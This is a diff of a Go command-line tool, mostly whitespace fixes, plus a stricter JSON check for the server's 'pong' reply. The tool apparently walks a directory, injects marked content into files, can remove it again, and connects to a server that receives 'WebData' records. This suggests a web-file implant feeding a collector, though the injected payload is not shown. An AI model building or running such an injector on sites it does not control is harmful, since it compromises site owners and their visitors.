@@ -19,14 +19,14 @@ const (
 )
 
 type Config struct {
-	Dir     string
-	Server  string
-	Mode    string // inject, monitor, remove
+	Dir    string
+	Server string
+	Mode   string // inject, monitor, remove
 }
 
 type WebData struct {
-	Type string   `json:"type"`
-	Data WebInfo  `json:"data"`
+	Type string  `json:"type"`
+	Data WebInfo `json:"data"`
 }
 
 type WebInfo struct {
@@ -124,7 +124,7 @@ func main() {
 func injectAll(dir, server string) {
 	fmt.Printf("[*] Scanning directory: %s\n", dir)
 	fmt.Printf("[*] Server: %s\n", server)
-	
+
 	count := 0
 	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
@@ -140,7 +140,7 @@ func injectAll(dir, server string) {
 		}
 		return nil
 	})
-	
+
 	if err != nil {
 		fmt.Printf("[!] Error walking directory: %v\n", err)
 	}
@@ -187,14 +187,14 @@ func injectFile(path, server string) bool {
 		fmt.Printf("[!] Cannot write: %s\n", path)
 		return false
 	}
-	
+
 	fmt.Printf("[+] Injected: %s\n", path)
 	return true
 }
 
 func removeAll(dir string) {
 	fmt.Printf("[*] Removing injections from: %s\n", dir)
-	
+
 	count := 0
 	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
@@ -210,7 +210,7 @@ func removeAll(dir string) {
 		}
 		return nil
 	})
-	
+
 	if err != nil {
 		fmt.Printf("[!] Error walking directory: %v\n", err)
 	}
@@ -233,7 +233,7 @@ func removeFile(path string) bool {
 	lines := strings.Split(contentStr, "\n")
 	var newLines []string
 	skip := false
-	
+
 	for _, line := range lines {
 		if strings.Contains(line, injectMarker) {
 			skip = true
@@ -260,22 +260,22 @@ func removeFile(path string) bool {
 	if err != nil {
 		return false
 	}
-	
+
 	fmt.Printf("[-] Removed: %s\n", path)
 	return true
 }
 
 func testConnection(server string) {
 	fmt.Printf("[*] Testing connection to %s...\n", server)
-	
+
 	conn, err := net.DialTimeout("tcp", server, 3*time.Second)
 	if err != nil {
 		fmt.Printf("[!] Connection failed: %v\n", err)
 		os.Exit(1)
 	}
 	defer conn.Close()
-	
-	// Send test ping
+
+	// Send test ping using the probe protocol (newline-delimited JSON)
 	pingData := map[string]string{"type": "ping"}
 	data, _ := json.Marshal(pingData)
 	_, err = conn.Write(append(data, '\n'))
@@ -283,7 +283,7 @@ func testConnection(server string) {
 		fmt.Printf("[!] Send failed: %v\n", err)
 		os.Exit(1)
 	}
-	
+
 	// Read response
 	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 	buf := make([]byte, 1024)
@@ -292,11 +292,18 @@ func testConnection(server string) {
 		fmt.Printf("[!] Read failed: %v\n", err)
 		os.Exit(1)
 	}
-	
+
 	response := strings.TrimSpace(string(buf[:n]))
-	if response == "pong" {
-		fmt.Printf("[+] Connection successful!\n")
-	} else {
-		fmt.Printf("[+] Response: %s\n", response)
+	var probe struct {
+		Type string `json:"type"`
 	}
+	if err := json.Unmarshal([]byte(response), &probe); err != nil {
+		fmt.Printf("[!] Unexpected response: %s\n", response)
+		os.Exit(1)
+	}
+	if probe.Type != "pong" {
+		fmt.Printf("[!] Unexpected response type: %s\n", probe.Type)
+		os.Exit(1)
+	}
+	fmt.Printf("[+] Connection successful!\n")
 }
